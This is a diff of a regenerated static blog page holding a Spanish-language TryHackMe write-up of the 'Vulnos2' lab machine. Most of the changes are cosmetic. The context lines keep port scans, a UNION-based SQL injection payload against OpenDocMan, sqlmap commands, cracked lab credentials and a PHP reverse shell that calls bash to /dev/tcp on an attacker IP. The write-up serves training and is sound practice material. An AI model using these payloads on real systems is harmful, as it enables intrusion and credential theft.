@@ -18,9 +18,9 @@
 
 <script defer src="/js/lazysizes.min.31dd6a2d3a1ec0f78a8df007535cf23f03aeb5c70f026e6d6a19dac3b3acc340.js"></script>
 
-<script defer src="/js/helper/getParents.min.ccd45f158c1b17849307ba913a72beac239c410f2b6e648496a79842da84e55b.js"></script>
+<script defer src="/js/helper/getParents.min.1618c696be7c98933f9a92677f518b512a74e55bdbb976b09936b4182e93181b.js"></script>
 
-<script defer src="/js/helper/fadeinout.min.9fb19682560d5fa5596fffec85da605067c4acc86aad05add4d8fff9d362a446.js"></script>
+<script defer src="/js/helper/fadeinout.min.93a331f96194789a542f33690bbe4f0c102c7e78ffc018217f5a1c33010bad91.js"></script>
 
 <script defer src="/js/helper/closest.min.js"></script>
   
@@ -1263,7 +1263,7 @@
     <meta property="twitter:description" content="Vulnos2 es una maquina de TryHackMe, encontramos multiples vulnerabilidades en OpenDocMan las cuales explotamos para obtener credenciales y acceer al panel de Drupal, que luego nos permitio ejecutar una shell inversa. Ejecutamos un exploit que afecta al Kernel de Linux para escalar privilegios.">
   
 
-<meta name="generator" content="Hugo 0.92.2" />
+<meta name="generator" content="Hugo 0.68.3" />
 <meta name="msapplication-TileColor" content="#1d1d1d">
 
 <meta name="theme-color" content="#1d1d1d">
@@ -1609,9 +1609,6 @@
   🏷️
   
 
-  <li><a href="https://sckull.github.io/tags/jabc-docs/" class="single__tag" title="jabc-docs">jabc-docs</a></li>
-  
-
   <li><a href="https://sckull.github.io/tags/sqli/" class="single__tag" title="sqli">sqli</a></li>
   
 
@@ -1619,6 +1616,9 @@
   
 
   <li><a href="https://sckull.github.io/tags/kernel/" class="single__tag" title="kernel">kernel</a></li>
+  
+
+  <li><a href="https://sckull.github.io/tags/jabc-docs/" class="single__tag" title="jabc-docs">jabc-docs</a></li>
   
 
 </ul>
@@ -1669,7 +1669,7 @@
 <p>Escaneo de puertos tcp/udp y servicios.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1728,7 +1728,7 @@
 </span><span class="lnt">57
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">root@kali:~/trymehack/vulnos2# masscan -p1-65535,U:1-65535 10.10.169.208 --rate<span class="o">=</span><span class="m">1000</span> -e tun0
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@kali:~/trymehack/vulnos2# masscan -p1-65535,U:1-65535 10.10.169.208 --rate<span class="o">=</span><span class="m">1000</span> -e tun0
 
 Starting masscan 1.0.5 <span class="o">(</span>http://bit.ly/14GZzcT<span class="o">)</span> at 2019-09-19 03:46:19 GMT
  -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
@@ -1792,11 +1792,11 @@ Service detection performed. Please report any incorrect results at https://nmap
 <h1 id="http">HTTP</h1>
 <p>Pagina en el puerto 80.<br />
 <img src="/images/posts/thm/vulnos2/Screenshot%20from%202019-09-18%2021.54.57.webp" alt="image" /></p>
-<h2 id="dirbuster">DIRBUSTER</h2>
+<h2 id="dirbuster-">DIRBUSTER</h2>
 <p>Realizamos una busqueda de direcotrios, archivos html y txt con dirbuster.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1820,7 +1820,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 </span><span class="lnt">22
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">root@kali:~/trymehack/vulnos2# gobuster dir -u http://10.10.169.208/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t <span class="nv">15</span>
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@kali:~/trymehack/vulnos2# gobuster dir -u http://10.10.169.208/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t <span class="nv">15</span>
 <span class="o">===============================================================</span>
 Gobuster v3.0.1
 by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
@@ -1861,7 +1861,7 @@ by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span 
 <h2 id="sql-injection---opendocman-127">SQL Injection - OpenDocMan 1.2.7</h2>
 <p>Comprobamos si la vulnerabilidad de SQLi esta presente en la plataforma con la url y parametros para ver el usuario (<code>user()</code>).</p>
 <p><strong>Payload:</strong></p>
-<pre tabindex="0"><code>ajax_udf.php?q=1&amp;add_value=odm_user%20UNION%20SELECT%201,user%28%29,3,4,5,6,7,8,9
+<pre><code>ajax_udf.php?q=1&amp;add_value=odm_user%20UNION%20SELECT%201,user%28%29,3,4,5,6,7,8,9
 </code></pre><p><img src="/images/posts/thm/vulnos2/Screenshot%20from%202019-09-18%2022.15.54.webp" alt="image" /></p>
 <p>Vemos que la vulnerabilidad esta presente ya que nos muestra el usuario. Para obtener los datos de la base de datos, utilizamos burpsuite para interceptar el trafico, guardamos el trafico del payload de SQLi de esta plataforma en un archivo response.req y utilizamos sqlmap con este archivo.</p>
 <p><strong>response.req</strong><br />
@@ -1870,14 +1870,14 @@ by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span 
 <p><strong>Comando:</strong></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">sqlmap -r response.req --dbs
+<pre class="chroma"><code class="language-bash" data-lang="bash">sqlmap -r response.req --dbs
 </code></pre></td></tr></table>
 </div>
 </div><p><img src="/images/posts/thm/vulnos2/Screenshot%20from%202019-09-18%2022.36.13.webp" alt="image" /></p>
-<pre tabindex="0"><code>Database: jabcd0cs
+<pre><code>Database: jabcd0cs
 [15 tables]
 +-------------------+
 | odm_access_log    |
@@ -1909,7 +1909,7 @@ Table: odm_user
 </code></pre><p>Utilizamos <code>md5online.org</code> para obtener la contraseña del hash md5 del usuario webadmin.</p>
 <p><img src="/images/posts/thm/vulnos2/Screenshot%20from%202019-09-18%2022.39.56.webp" alt="image" /></p>
 <p><strong>Credenciales:</strong></p>
-<pre tabindex="0"><code>webmin:webmin1980
+<pre><code>webmin:webmin1980
 guest:guest
 </code></pre><h1 id="shell---php">SHELL - PHP</h1>
 <p>Ya que tenemos las credenciales de administrador regresamos a la pagina principal <code>/jabc/</code> y visitamos el panel de inicio de sesion y utilizamos las credenciales (<code>webmin:webmin1980</code>), ya que tenemos control de las paginas habilitamos el modulo de PHP (PHP Filter), luego de esto agregamos codigo php con nuestra shell inversa a la pagina de &lsquo;Documentation&rsquo;.</p>
@@ -1918,15 +1918,15 @@ guest:guest
 <p><strong>Codigo PHP:</strong></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
 <span class="nx">exec</span><span class="p">(</span><span class="s2">&#34;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.8.1.72/1337 0&gt;&amp;1&#39;&#34;</span><span class="p">);</span>
-<span class="cp">?&gt;</span><span class="err">
-</span></code></pre></td></tr></table>
+<span class="cp">?&gt;</span>
+</code></pre></td></tr></table>
 </div>
 </div><p><img src="/images/posts/thm/vulnos2/Screenshot%20from%202019-09-18%2023.47.14.webp" alt="image" /></p>
 <p><strong>Netcat:</strong></p>
@@ -2220,7 +2220,7 @@ guest:guest
 </div>
 
 
-<script defer src="/js/swipe.min.d70095d96ef6a016133ea2c732c5d4713539d335b739178e356af46f54cf0a16.js"></script>
+<script defer src="/js/swipe.min.08ff2be1b74347bad9e267f732f1388d271b2f9d97b6a8a87bd6a510f17c5ad2.js"></script>
 
 <script defer src="/js/micromodal.min.de01b44b2f383056bbcaf6ee921fd385d79108ec1129afd0eb2f3f5a07e11f45.js"></script>
 
@@ -3338,7 +3338,7 @@ var a = document.getElementsByClassName('navbar__menu-item')
     <li><a href="#whatweb">WHATWEB</a></li>
     <li><a href="#http">HTTP</a>
       <ul>
-        <li><a href="#dirbuster">DIRBUSTER</a></li>
+        <li><a href="#dirbuster-">DIRBUSTER</a></li>
         <li><a href="#http---jabc">HTTP - /jabc/</a></li>
         <li><a href="#http---jabcd0cs">HTTP - /jabcd0cs/</a></li>
       </ul>
